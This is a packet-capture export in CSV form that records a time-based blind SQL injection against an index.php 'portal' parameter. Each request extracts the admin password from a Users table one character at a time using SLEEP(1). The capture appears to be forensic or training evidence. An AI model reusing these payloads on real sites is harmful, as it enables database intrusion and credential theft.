"No.","Time","Source","Destination","Protocol","Length","Info"
"3286","35.613807634","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D73%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3288","35.616621058","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3296","35.629831154","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D74%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3298","35.632363435","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3306","35.643550635","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D75%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3308","35.646363266","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3316","35.660680522","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D76%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3318","35.663490838","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3326","35.675106499","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D77%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3328","35.677905013","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3336","35.688724338","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D78%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3338","35.691454379","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3346","35.704782235","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D79%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3348","35.707569820","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3356","35.725689751","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D80%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3358","35.728465466","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3366","35.740137574","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D81%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3368","35.742972849","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3376","35.754991600","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D82%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3378","35.757661990","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3386","35.768083833","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D83%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3388","35.770901360","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3396","35.781605872","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D84%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3398","35.784165324","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3406","35.795050686","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D85%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3408","35.797755396","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3416","35.808441415","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D86%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3418","35.811254769","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3426","35.830438598","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D87%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3428","35.833089801","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3436","35.843473446","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D88%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3438","35.844591210","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3446","35.858163855","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D89%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3448","35.860934632","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3456","35.871355550","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D90%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3458","35.873523183","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3466","35.884022505","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D33%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3468","35.885792473","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3476","35.896344854","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D34%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3478","35.897740300","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3486","35.908135146","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D35%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3488","35.909567087","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3496","35.925466202","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D36%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3498","35.927043761","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3506","35.937477564","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D37%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3508","35.940083581","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3516","35.950566415","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D38%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3518","35.953347804","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3526","35.964750767","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D39%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3528","35.967528981","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3536","35.978096795","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D40%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3538","35.980873682","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3546","35.991428161","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D41%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3548","35.994170088","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3556","36.004588975","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D42%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3558","36.007324939","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3566","36.026181629","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D43%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3568","36.028994552","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3576","36.041219285","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D44%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3578","36.044001994","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3586","36.054803559","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D45%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3588","36.057567182","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3596","36.068759675","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D46%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3598","36.071305555","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3606","36.082380228","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D47%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3608","36.085183044","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3616","36.096322600","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D58%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3618","36.099127011","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3626","36.110074350","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D59%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3628","36.112907800","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3642","37.230900908","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D60%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3644","37.233653447","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3652","37.245419392","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D61%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3654","37.248206619","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3662","37.262704290","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D62%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3664","37.265459957","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3672","37.276934875","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D63%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3674","37.279722711","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3682","37.291827987","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D64%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3684","37.294641439","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3692","37.306259739","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D91%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3694","37.309060541","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3702","37.320140022","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D92%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3704","37.322686158","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3712","37.337412859","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D93%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3714","37.340217847","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3722","37.351784228","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D94%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3724","37.353549775","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3732","37.367764495","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D95%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3734","37.368761622","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3742","37.380198083","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D96%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3744","37.381502986","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3751","37.393161600","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C9%2C1%29%29%3D123%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3756","40.396729882","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3765","40.410745694","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D48%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3767","40.413570049","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3775","40.424210604","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D49%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3777","40.427023068","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3785","40.442357093","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D50%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3787","40.445113886","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3795","40.458716640","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D51%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3797","40.459940259","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3805","40.472337871","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D52%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3807","40.473148805","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3815","40.485478344","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D53%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3817","40.486591235","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3825","40.497505840","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D54%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3827","40.498759454","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3835","40.509619532","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D55%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3837","40.511210019","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3845","40.521683811","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D56%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3847","40.524001702","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3855","40.544279925","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D57%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3857","40.547090006","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3865","40.560661139","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D97%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3867","40.563403529","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3875","40.575776774","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D98%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3877","40.578581587","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3885","40.591218181","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D99%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3887","40.593946539","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3895","40.604597180","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D100%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3897","40.607364337","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3905","40.620165936","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D101%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3907","40.623004960","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3915","40.639598238","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D102%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"3917","40.642401633","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"3925","40.654699099","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C10%2C1%29%29%3D103%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
